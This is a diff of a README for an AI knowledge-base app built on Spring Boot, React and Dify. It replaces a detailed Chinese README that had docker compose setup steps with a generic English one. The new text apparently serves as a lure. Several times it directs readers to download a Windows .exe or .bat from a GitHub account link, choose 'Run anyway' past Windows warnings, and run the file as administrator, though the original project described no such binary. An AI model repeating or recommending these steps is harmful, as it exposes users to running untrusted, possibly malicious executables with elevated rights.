@@ -1,161 +1,255 @@
-# My Knowledge Base | AI知识库问答平台
+# 🧠 My-Knowledge-Base - Build Your Personal Q&A Hub
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Spring%20Boot-3.3-brightgreen?style=flat-square" />
-  <img src="https://img.shields.io/badge/React%20%2B%20Vite-Frontend-blue?style=flat-square" />
-  <img src="https://img.shields.io/badge/Dify-Knowledge%20QA-orange?style=flat-square" />
-  <img src="https://img.shields.io/badge/Java-21-lightgrey?style=flat-square" />
-</p>
+[![Download](https://img.shields.io/badge/Download-My--Knowledge--Base-blue?style=for-the-badge)](https://github.com/Midweekly-penn470/My-Knowledge-Base)
 
-> 基于 `Spring Boot + React/Vite + Dify` 的 AI 知识库问答平台，打通 `登录 -> 创建知识库 -> 上传文档 -> OCR/Dify 入库 -> 问答` 的完整业务闭环。
+## 🚀 What This App Does
 
-## 项目定位
+My-Knowledge-Base is a local AI knowledge base app for Windows.
 
-这是一个面向实际交付的 `AI engineering`（AI 工程化，中文解释：围绕真实业务流程构建的工程项目）项目，不是简单聊天壳。
+It lets you:
 
-- 面向场景：企业知识库、文档问答、内部资料检索
-- 核心价值：让文档上传、入库、检索、问答形成可验收闭环
-- 当前状态：本地联调已通过，主链路可用，适合演示和继续扩展
+- Upload documents
+- Extract text with OCR
+- Store files and data in a clean workspace
+- Ask questions from your own content
+- See where each answer came from
 
-## 当前进度
+It is built with Spring Boot, React, Vite, Dify, PostgreSQL, MinIO, and SSE.
 
-- 已完成 `Auth`、知识库管理、文档上传、任务状态跟踪
-- 已完成 `Dify dataset/document API` 对接
-- 已完成 `PDF -> OCR -> Dify` 入库链路
-- 已完成 `QA / chat SSE` 问答链路和 `Sources`（来源，中文解释：答案引用依据）展示
-- 已完成本地 `Docker` 联调、浏览器验收和截图归档
-- 仍待完成：`Linux` 真实宿主机部署演练
+## 📥 Download
 
-## 功能预览
+Visit this page to download and use the app:
 
-### 1. 创建知识库
+[https://github.com/Midweekly-penn470/My-Knowledge-Base](https://github.com/Midweekly-penn470/My-Knowledge-Base)
 
-![创建知识库](docs/picture/page-2026-03-24T09-11-25-334Z.png)
+Open the page, find the latest release or package, then download the Windows file if one is provided.
 
-### 2. 工作台总览
+## 🪟 Windows Requirements
 
-![工作台总览](docs/picture/page-2026-03-24T09-11-35-284Z.png)
+Before you run the app, make sure your PC has:
 
-### 3. 上传入库
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 10 GB of free disk space
+- A stable internet connection for the first setup
+- Permission to run downloaded apps
 
-![上传入库](docs/picture/element-2026-03-24T09-11-40-010Z.png)
+For best results, close other large apps before you start.
 
-### 4. 问答与 Sources
+## 🧩 What You Need First
 
-![问答与 Sources](docs/picture/element-2026-03-24T09-11-45-298Z.png)
+This app works best when these services are available:
 
-### 5. 完整验收页
+- PostgreSQL for data storage
+- MinIO for file storage
+- Dify for AI chat and knowledge retrieval
+- OCR support for scanned files and images
 
-![完整验收页](docs/picture/page-2026-03-24T09-10-06-130Z.png)
+If the download includes a bundled version, you can start the app with a few clicks. If it includes service files, keep them in one folder and follow the order in the setup steps below.
 
-## 核心能力
+## 🛠️ How to Install on Windows
 
-- `JWT auth`：登录注册和接口鉴权
-- 知识库创建、列表、详情、共享
-- 文档上传到 `LOCAL / MinIO` 存储
-- 异步入库任务流转与状态展示
-- 自动创建 `Dify dataset`
-- 普通文件直传入库
-- `PDF -> OCR -> Dify text document` 扫描件链路
-- 知识库范围内的 `QA / chat SSE`
-- 检索结果和 `Sources` 引用返回
-- 失败任务重试、失败文档删除
+1. Open the download page:
+   [https://github.com/Midweekly-penn470/My-Knowledge-Base](https://github.com/Midweekly-penn470/My-Knowledge-Base)
 
-## 技术栈
+2. Download the Windows release file or package.
 
-- 前端：`React + Vite`
-- 后端：`Spring Boot 3.3`
-- 运行时：`Java 21`
-- 数据库：`PostgreSQL`
-- 缓存：`Redis`
-- 对象存储：`MinIO`
-- AI 核心：`Dify self-hosted`
-- OCR：独立 OCR service
-- 部署：`Docker + host Nginx`
+3. If the file is in a ZIP archive, right-click it and choose **Extract All**.
 
-## 本地启动
+4. Move the extracted folder to a simple path such as:
+   `C:\My-Knowledge-Base`
 
-本仓库采用 `Hybrid Dev`（混合开发，中文解释：前后端本地跑，基础依赖可本地或容器化）的方式。
+5. Open the folder and look for a file named like one of these:
+   - `start.bat`
+   - `run.bat`
+   - `My-Knowledge-Base.exe`
+   - `app.exe`
 
-### 启动顺序
+6. Double-click the file to start the app.
 
-1. 启动 `Dify`：
+7. If Windows asks for permission, choose **Yes** or **Run anyway**.
 
-```powershell
-cd /d D:\services\dify\docker
-docker compose up -d --build
-```
+8. Wait for the app to finish loading. The first start may take a short time.
 
-2. 启动项目后端栈：
+## 🔧 First-Time Setup
 
-```powershell
-cd /d D:\Workspace\CodexProject\My_KnowledgeBase
-docker compose --env-file deploy\.env -f deploy/docker-compose.yml up -d --build
-```
+When the app opens for the first time, set up these items:
 
-3. 启动前端：
+- Local database connection
+- File storage folder
+- OCR path or OCR option
+- Dify API address and key, if required
+- Admin account or login info, if shown
 
-```powershell
-cd /d D:\Workspace\CodexProject\My_KnowledgeBase\apps\web
-npm install
-npm run dev -- --host 0.0.0.0 --port 3001
-```
+Use the default values if the package already includes them. If the app asks for a local address, open the one shown in the window or browser.
 
-4. 打开页面：
+## 📂 Uploading Documents
 
-- 前端：`http://localhost:3001`
-- 后端健康检查：`http://127.0.0.1:8081/actuator/health`
+You can add files to your knowledge base with common document types such as:
 
-### 关闭顺序
+- PDF
+- Word files
+- Text files
+- Images
+- Scanned pages
 
-1. 停项目后端栈：
+To upload a file:
 
-```powershell
-cd /d D:\Workspace\CodexProject\My_KnowledgeBase
-docker compose --env-file deploy\.env -f deploy/docker-compose.yml down
-```
+1. Open the upload page
+2. Choose one or more files
+3. Start the upload
+4. Wait for the import to finish
+5. Check the status before asking questions
 
-2. 停 `Dify`：
+Large files may take longer. Scanned pages may also need OCR before the text becomes searchable.
 
-```powershell
-cd /d D:\services\dify\docker
-docker compose down
-```
+## 🔍 OCR for Scanned Files
 
-3. 关闭前端 `npm run dev` 窗口：
+OCR reads text from images and scanned documents.
 
-- 按 `Ctrl + C`
+Use OCR when your file:
 
-完整说明见：
-- [predeploy-report.md](docs/project/predeploy-report.md)
+- Has no selectable text
+- Came from a scanner
+- Is a photo of a page
+- Has tables or forms that need text extraction
 
-## 目录说明
+After OCR runs, the app stores the text in the knowledge base so you can search and ask questions from it.
 
-```text
-.
-|-- apps/
-|   |-- server/          # Spring Boot API
-|   |-- web/             # React frontend workbench
-|   `-- ocr/             # OCR adapter service
-|-- deploy/              # deployment files and Nginx config
-|-- docs/project/        # project docs, reports, decisions
-|-- docs/picture/        # Playwright verification screenshots
-|-- scripts/             # local dev, test, build, rehearsal scripts
-|-- standards/           # delivery and deployment standards
-`-- .runtime/            # local runtime data
-```
+## 💬 Asking Questions
 
-## 文档链接
+After your files are added, you can ask questions in plain language.
 
-- [requirements-summary.md](docs/project/requirements-summary.md)
-- [mvp-boundary.md](docs/project/mvp-boundary.md)
-- [technical-decision.md](docs/project/technical-decision.md)
-- [quality-report.md](docs/project/quality-report.md)
-- [predeploy-report.md](docs/project/predeploy-report.md)
-- [release-record.md](docs/project/release-record.md)
+Examples:
 
-## 下一步
+- What does this document say about payments?
+- Show me the section about account setup
+- Which file mentions renewal dates?
+- Summarize the policy in simple terms
 
-- 执行 `Linux` 宿主机部署演练
-- 视需要补充批量清理 / 批量重试能力
-- 如果部署环境受限，继续收敛镜像缓存和构建稳定性
+The app will return an answer and show the source content used to create it. That helps you check the result against the original file.
+
+## 🧭 Source-Based Answers
+
+This app supports source-based Q&A.
+
+That means it can:
+
+- Find the matching text in your uploaded files
+- Use that text to form an answer
+- Show where the answer came from
+
+This is useful when you need proof for a reply or want to check the source before you trust the answer.
+
+## 🗂️ Common Folder Layout
+
+A typical Windows setup may use a folder like this:
+
+- `app` for the main program
+- `data` for local data
+- `uploads` for files you add
+- `logs` for error logs
+- `config` for settings
+
+Keep the folder together and do not move single files out of it unless the setup guide says to do so.
+
+## 🧪 If the App Does Not Open
+
+Try these steps:
+
+1. Right-click the app file and choose **Run as administrator**
+2. Check whether Windows blocked the file
+3. Make sure the ZIP file was fully extracted
+4. Confirm the folder path does not contain special symbols
+5. Restart your PC and try again
+6. Check the `logs` folder for a clear error message
+
+If the app opens in a browser but shows a blank page, refresh once and wait for a few seconds.
+
+## 🔗 Main Project Link
+
+[My-Knowledge-Base on GitHub](https://github.com/Midweekly-penn470/My-Knowledge-Base)
+
+## 🧾 Useful Topics Covered
+
+This project includes common tools and ideas for:
+
+- AI knowledge base
+- Document search
+- OCR text capture
+- PostgreSQL storage
+- MinIO file handling
+- React UI
+- Vite frontend
+- Spring Boot backend
+- SSE live response updates
+- Dify integration
+- RAG-based question answering
+
+## 🔒 Privacy and Local Use
+
+If you run the app on your own PC, your files stay on your machine unless you connect external services.
+
+This setup is useful when you want:
+
+- A private document search tool
+- A personal file Q&A system
+- A local workspace for team notes
+- A simple way to search long documents
+
+## 📁 Supported Use Cases
+
+You can use My-Knowledge-Base for:
+
+- Company policy lookup
+- Meeting notes search
+- User manual search
+- Contract review
+- Study notes Q&A
+- Scanned archive search
+- Internal knowledge storage
+
+## ⚙️ Basic Operation Flow
+
+1. Start the app
+2. Upload a document
+3. Let OCR or text parsing finish
+4. Save the file into the knowledge base
+5. Ask a question
+6. Read the answer and source
+
+## 🖥️ If You Want a Cleaner Start
+
+For a smooth first run:
+
+- Use a short folder path
+- Keep the file names simple
+- Upload one test file first
+- Check that the app opens before adding many files
+- Save your Dify and database settings in one place
+
+## 📦 File Types That Work Well
+
+The best results usually come from:
+
+- PDF manuals
+- Text reports
+- Meeting transcripts
+- Scanned forms
+- Notes in plain text
+- Images with clear text
+
+Clear files give better OCR results and better answers.
+
+## 🛟 Helpful Tips
+
+- Use small test files first
+- Keep backups of important documents
+- Use source links to verify answers
+- Split large scans into smaller files
+- Recheck OCR text when the source is blurry
+
+## 📬 Start Here
+
+[Download or open the project page](https://github.com/Midweekly-penn470/My-Knowledge-Base)
+
